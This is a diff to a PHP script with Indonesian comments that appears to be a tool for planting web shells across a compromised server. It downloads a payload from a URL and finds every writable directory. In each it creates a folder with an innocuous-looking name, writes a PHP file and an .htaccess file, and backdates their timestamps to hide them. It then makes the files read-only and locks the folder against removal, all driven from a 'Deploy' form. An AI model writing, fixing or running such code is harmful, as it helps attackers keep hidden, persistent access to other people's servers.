@@ -1,13 +1,14 @@
-<?php
+<?php 
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-define('SCRIPT_VERSION', '2025-07-08-v4');
+define('SCRIPT_VERSION', '2025-07-08-v4-fixed');
 
 $success = [];
 $error = [];
 
+// Ambil file dari URL
 function fetchFileFromUrl($url) {
     $ch = curl_init($url);
     curl_setopt_array($ch, [
@@ -21,6 +22,7 @@ function fetchFileFromUrl($url) {
     return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
 }
 
+// Generate nama folder acak
 function generateRandomFolderName($base, $used = []) {
     $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
     shuffle($names);
@@ -33,6 +35,7 @@ function generateRandomFolderName($base, $used = []) {
     return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
 }
 
+// Cari semua folder writable
 function findAllWritableFolders($dir, &$errorLog = []) {
     $results = [];
     $queue = [$dir];
@@ -95,47 +98,47 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $newFolder = generateRandomFolderName($base, $usedFolders);
                     $usedFolders[] = $newFolder;
 
-                    if ($timestamp && @touch($newFolder, $timestamp)) {
-    $success[] = "⏱️ Timestamp folder set: $newFolder";
-} elseif ($timestamp) {
-    $error[] = "❌ Gagal set timestamp folder: $newFolder";
-}
+                    // Pastikan folder baru dibuat
+                    if (!is_dir($newFolder)) {
+                        if (!mkdir($newFolder, 0755, true)) {
+                            $error[] = "❌ Gagal membuat folder: $newFolder";
+                            continue; 
+                        } else {
+                            $success[] = "📁 Folder dibuat: $newFolder";
+                        }
+                    }
 
+                    // Set timestamp folder
+                    if ($timestamp && @touch($newFolder, $timestamp)) {
+                        $success[] = "⏱️ Timestamp folder set: $newFolder";
+                    } elseif ($timestamp) {
+                        $error[] = "❌ Gagal set timestamp folder: $newFolder";
+                    }
 
                     $phpPath = $newFolder . '/' . $phpName;
                     $htPath  = $newFolder . '/.htaccess';
 
+                    // Tulis PHP file
                     $ok1 = file_put_contents($phpPath, $phpContent);
-                    $ok2 = file_put_contents($htPath, $htaccessContent);
-                    // Set timestamp jika valid
-                    if ($timestamp) {
-                        if (file_exists($phpPath) && @touch($phpPath, $timestamp)) {
-                            $success[] = "⏱️ Timestamp set: $phpPath";
-                        } else {
-                            $error[] = "❌ Gagal set timestamp PHP: $phpPath";
-                        }
-                    
-                        if (file_exists($htPath) && @touch($htPath, $timestamp)) {
-                            $success[] = "⏱️ Timestamp set: $htPath";
-                        } else {
-                            $error[] = "❌ Gagal set timestamp .htaccess: $htPath";
-                        }
-                    }
-
                     if ($ok1 !== false) {
+                        if ($timestamp) @touch($phpPath, $timestamp);
                         chmod($phpPath, 0444);
                         $success[] = "✅ PHP: $phpPath (chmod 0444)";
                     } else {
                         $error[] = "❌ Gagal tulis PHP: $phpPath";
                     }
 
+                    // Tulis .htaccess
+                    $ok2 = file_put_contents($htPath, $htaccessContent);
                     if ($ok2 !== false) {
+                        if ($timestamp) @touch($htPath, $timestamp);
                         chmod($htPath, 0444);
                         $success[] = "✅ .htaccess: $htPath (chmod 0444)";
                     } else {
                         $error[] = "❌ Gagal tulis .htaccess: $htPath";
                     }
 
+                    // Kunci folder
                     if (chmod($newFolder, 0111)) {
                         $success[] = "🔒 Folder dikunci: $newFolder (chmod 0111)";
                     } else {
@@ -179,9 +182,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <input type="number" name="folder_limit" min="1" max="50" value="5">
 
         <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
-<input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
+        <input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
 
-        
         <button type="submit">🚀 Deploy Sekarang</button>
     </form>
 
